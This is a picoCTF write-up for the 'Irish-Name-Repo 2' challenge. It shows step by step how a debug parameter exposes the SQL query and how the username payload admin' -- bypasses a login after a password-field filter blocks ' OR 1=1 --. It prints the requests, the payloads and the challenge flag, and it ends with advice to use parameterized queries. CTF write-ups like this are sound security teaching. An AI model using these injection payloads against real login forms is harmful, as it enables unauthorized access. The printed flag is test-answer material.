# 🐍 Irish-Name-Repo 2 — picoCTF Writeup

> **Challenge:** Irish-Name-Repo 2
> **Category:** Web Exploitation / SQL Injection
> **Platform:** picoCTF
> **Target:** `http://fickle-tempest.picoctf.net:52622`

---

## 📌 Challenge Description

> Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login!

This challenge is a continuation of **Irish-Name-Repo 1**.

The previous challenge was vulnerable to SQL injection through the password field. This time, the application has added filtering to prevent the same attack.

The key is to notice that **not every input field is necessarily protected in the same way**.

---

## 🌐 Step 1 — Open the Login Page

I first opened:

```text id="1e8jlv"
http://fickle-tempest.picoctf.net:52622/login.html
```

I entered some test credentials and intercepted the login request using **Burp Suite**.

The request looked like:

```http id="q6h21u"
POST /login.php HTTP/1.1
Host: fickle-tempest.picoctf.net:52622
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&debug=0
```

Once again, we have a `debug` parameter.

---

## 🔍 Step 2 — Enable Debug Mode

I sent the request to **Burp Suite → Repeater** and changed:

```text id="1q4x8h"
debug=0
```

to:

```text id="h4e5aw"
debug=1
```

The server returned:

```html id="r9h5u1"
<pre>
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
</pre>

<h1>Login failed.</h1>
```

Once again, the application reveals the SQL query being executed.

---

## 💉 Step 3 — Try the Previous SQL Injection

From **Irish-Name-Repo 1**, we know that the following payload worked:

```text id="fjq0qk"
' OR 1=1 --
```

So I tried:

```text id="c6b8xq"
username=admin&password=' OR 1=1 --&debug=1
```

But this time, instead of getting authenticated, the server responded:

```text id="a7fd5d"
SQLi detected.
```

This tells us that the application is now detecting the SQL injection payload.

---

## 🧠 Step 4 — Look for Another Injection Point

The password field is clearly being filtered.

But there are **two user-controlled fields**:

```text id="1stqck"
username
password
```

So instead of injecting SQL into the password field, I tried the **username** field.

The idea was to terminate the username string and comment out the rest of the SQL query.

---

## 🎯 Step 5 — Inject Through the Username

I used:

```text id="c4w6e0"
admin' --
```

The request became:

```text id="at9t8y"
username=admin' --&password=admin&debug=1
```

The resulting SQL query is effectively:

```sql id="n5kpsk"
SELECT * FROM users
WHERE name='admin' --'
AND password='admin'
```

The `--` begins a SQL comment, so the password check is ignored.

The query effectively becomes:

```sql id="4yxu7p"
SELECT * FROM users
WHERE name='admin'
```

Therefore, we no longer need to know the actual password.

---

## 🚩 Step 6 — Retrieve the Flag

After sending the request through Burp Repeater, the server accepted the login and returned:

```text id="6esd7f"
Your flag is: picoCTF{m0R3_SQL_plz_8c334129}
```

---

# 🏁 Final Flag

```text id="5nqg3g"
picoCTF{m0R3_SQL_plz_8c334129}
```

---

## 🧠 Why the Attack Worked

The application attempted to strengthen the login by detecting SQL injection in the password field.

Our first attempt:

```text id="1uev7n"
password=' OR 1=1 --
```

was detected.

However, the application still allowed SQL syntax to reach the database through the username field.

The successful payload was:

```text id="3k2tqf"
username=admin' --
```

This closes the original username string and comments out the rest of the query.

### Original query

```sql id="xq7g8x"
SELECT * FROM users
WHERE name='admin'
AND password='admin'
```

### After injection

Conceptually:

```sql id="7u6i0k"
SELECT * FROM users
WHERE name='admin' --'
AND password='admin'
```

Everything after `--` is treated as a comment.

The password comparison is therefore ignored.

---

## 🔄 Attack Flow

```text id="5d7ypx"
Open login page
       │
       ▼
Intercept POST request
       │
       ▼
Change debug=0 → debug=1
       │
       ▼
SQL query is exposed
       │
       ▼
Try previous payload:
password=' OR 1=1 --
       │
       ▼
SQLi detected
       │
       ▼
Try another input field
       │
       ▼
username=admin' --
       │
       ▼
Password check commented out
       │
       ▼
Login bypass
       │
       ▼
picoCTF{m0R3_SQL_plz_8c334129}
```

---

## 🛠️ Tool Used

* **Burp Suite**

  * Proxy → Intercept
  * Repeater

---

## 🔑 Key Takeaways

* Input filtering in one parameter does not necessarily secure the entire application.
* Test **all user-controlled parameters**, not just the obvious one.
* Debug output can reveal valuable information about backend SQL queries.
* SQL comments such as `--` can sometimes be used to remove part of a query.
* Properly implemented **parameterized queries / prepared statements** are the correct defense against SQL injection.

---

## 🏆 Final Payload

```text
username=admin' --&password=admin&debug=1
```

### Result

```text
picoCTF{m0R3_SQL_plz_8c334129}
```

**Challenge solved! 🎉**
